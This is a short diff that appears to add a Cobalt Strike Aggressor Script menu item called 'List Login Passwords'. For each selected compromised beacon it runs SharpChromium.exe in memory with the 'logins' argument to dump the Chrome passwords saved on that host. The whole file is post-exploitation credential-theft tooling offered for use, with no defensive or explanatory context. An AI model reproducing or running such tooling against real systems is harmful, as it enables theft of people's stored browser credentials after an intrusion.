@@ -1,0 +1,11 @@
+item "List Login Passwords"{
+			local('$bid');
+				foreach $bid ($1){
+					sharplogins($bid);
+				}
+			}
+			
+			
+sub sharplogins{
+bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "logins");
+}			
